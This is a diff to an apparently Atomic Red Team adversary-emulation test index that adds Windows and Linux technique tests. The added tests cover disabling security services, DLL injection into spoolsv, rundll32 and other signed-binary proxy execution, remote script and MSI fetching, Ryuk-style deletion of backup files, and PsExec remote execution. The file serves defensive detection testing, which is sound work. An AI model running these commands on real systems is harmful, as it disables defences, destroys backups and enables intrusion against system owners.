@@ -6571,8 +6571,29 @@ defense-evasion:
           -Recurse
 
 '
-        cleanup_command: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+        cleanup_command: 'New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
           -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+
+'
+    - name: Disable Arbitrary Security Windows Service
+      description: "With administrative rights, an adversary can disable Windows Services
+        related to security products. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        service_name:
+          description: The name of the service to stop
+          type: String
+          default: McAfeeDLPAgentService
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          net.exe stop #{service_name}
+          sc.exe config #{service_name} start= disabled
+        cleanup_command: |-
+          sc.exe config #{service_name} start= auto
+          net.exe start #{service_name}
   T1107:
     technique:
       x_mitre_data_sources:
@@ -9619,13 +9640,13 @@ defense-evasion:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
     - name: Process Injection via PowerSploit
       description: 'PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
 
@@ -9640,19 +9661,18 @@ defense-evasion:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
     - name: Shared Library Injection via /etc/ld.so.preload
-      description: 'This test adds a shared library to the `ld.so.preload` list to
+      description: "This test adds a shared library to the `ld.so.preload` list to
         execute and intercept API calls. This technique was used by threat actor Rocke
         during the exploitation of Linux web servers. This requires the `glibc` package.
-
-'
+        \n"
       supported_platforms:
       - linux
       input_arguments:
@@ -10144,11 +10164,11 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
 
 '
     - name: Rundll32 execute VBscript command
@@ -10167,6 +10187,80 @@ defense-evasion:
         name: command_prompt
         elevation_required: false
         command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
+
+'
+    - name: Rundll32 advpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with advpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 ieadvpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 syssetup.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with syssetup.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
+          128 .\#{inf_to_execute}
+
+'
+    - name: Rundll32 setupapi.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with setupapi.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
+          .\#{inf_to_execute}
 
 '
   T1064:
@@ -10411,8 +10505,9 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
-          \n"
+        command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
+
+'
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
 
@@ -10426,7 +10521,9 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
         in application installation, commonly seen in malware execution.
@@ -10441,7 +10538,9 @@ defense-evasion:
           default: http://site.com/file.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
         installation.
@@ -10456,7 +10555,9 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+        command: 'msiexec.exe /y "#{dll_payload}"
+
+'
     - name: Odbcconf.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally.
 
@@ -10471,6 +10572,24 @@ defense-evasion:
       executor:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
+    - name: InfDefaultInstall.exe .inf Execution
+      description: |
+        Test execution of a .inf using InfDefaultInstall.exe
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'InfDefaultInstall.exe #{inf_to_execute}
 
 '
   T1216:
@@ -10544,6 +10663,44 @@ defense-evasion:
           localhost "script:#{remote_payload}"
 
 '
+    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServe script with options
+        to execute an arbitrary PowerShell command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A PowerShell command to execute.
+          type: string
+          default: Start-Process calc
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+
+'
+    - name: manage-bde.wsf Signed Script Command Execution
+      description: 'Executes the signed manage-bde.wsf script with options to execute
+        an arbitrary command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A command to execute.
+          type: Path
+          default: C:\Windows\System32\calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        prereq_command: ''
+        command: |
+          set comspec=#{command_to_execute}
+          cscript manage-bde.wsf
+        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
   T1151:
     technique:
       x_mitre_data_sources:
@@ -12847,13 +13004,13 @@ privilege-escalation:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
     - name: Process Injection via PowerSploit
       description: 'PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
 
@@ -12868,19 +13025,18 @@ privilege-escalation:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
     - name: Shared Library Injection via /etc/ld.so.preload
-      description: 'This test adds a shared library to the `ld.so.preload` list to
+      description: "This test adds a shared library to the `ld.so.preload` list to
         execute and intercept API calls. This technique was used by threat actor Rocke
         during the exploitation of Linux web servers. This requires the `glibc` package.
-
-'
+        \n"
       supported_platforms:
       - linux
       input_arguments:
@@ -13783,7 +13939,19 @@ impact:
           default: "/var/log/syslog"
       executor:
         name: bash
-        command: dd of=#{file_to_overwrite} if=#{overwrite_source}
+        command: 'dd of=#{file_to_overwrite} if=#{overwrite_source}
+
+'
+    - name: Windows - Delete Backup Files
+      description: 'Deletes backup files in a manner similar to Ryuk ransomware.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
+          c:\backup*.* c:\*.set c:\*.win c:\*.dsk
   '':
     technique:
       x_mitre_data_sources:
@@ -20240,11 +20408,11 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
 
 '
     - name: Rundll32 execute VBscript command
@@ -20263,6 +20431,80 @@ execution:
         name: command_prompt
         elevation_required: false
         command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
+
+'
+    - name: Rundll32 advpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with advpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 ieadvpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 syssetup.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with syssetup.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
+          128 .\#{inf_to_execute}
+
+'
+    - name: Rundll32 setupapi.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with setupapi.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
+          .\#{inf_to_execute}
 
 '
   T1053:
@@ -20727,8 +20969,9 @@ execution:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
-          \n"
+        command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
+
+'
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
 
@@ -20742,7 +20985,9 @@ execution:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
         in application installation, commonly seen in malware execution.
@@ -20757,7 +21002,9 @@ execution:
           default: http://site.com/file.msi
       executor:
         name: command_prompt
-        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
     - name: Msiexec.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
         installation.
@@ -20772,7 +21019,9 @@ execution:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+        command: 'msiexec.exe /y "#{dll_payload}"
+
+'
     - name: Odbcconf.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally.
 
@@ -20787,6 +21036,24 @@ execution:
       executor:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
+    - name: InfDefaultInstall.exe .inf Execution
+      description: |
+        Test execution of a .inf using InfDefaultInstall.exe
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'InfDefaultInstall.exe #{inf_to_execute}
 
 '
   T1216:
@@ -20860,6 +21127,44 @@ execution:
           localhost "script:#{remote_payload}"
 
 '
+    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServe script with options
+        to execute an arbitrary PowerShell command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A PowerShell command to execute.
+          type: string
+          default: Start-Process calc
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+
+'
+    - name: manage-bde.wsf Signed Script Command Execution
+      description: 'Executes the signed manage-bde.wsf script with options to execute
+        an arbitrary command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A command to execute.
+          type: Path
+          default: C:\Windows\System32\calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        prereq_command: ''
+        command: |
+          set comspec=#{command_to_execute}
+          cscript manage-bde.wsf
+        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
   T1153:
     technique:
       x_mitre_data_sources:
@@ -22593,6 +22898,28 @@ lateral-movement:
         name: powershell
         elevation_required: false
         command: 'New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
+
+'
+    - name: Copy and Execute File with PsExec
+      description: 'Copies a file to a remote host and executes it using PsExec. Requires
+        the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote computer to receive the copy and execute the file
+          type: String
+          default: "\\\\localhost"
+        command_path:
+          description: File to copy and execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'psexec.exe #{remote_host} -c #{command_path}
 
 '
   T1028:
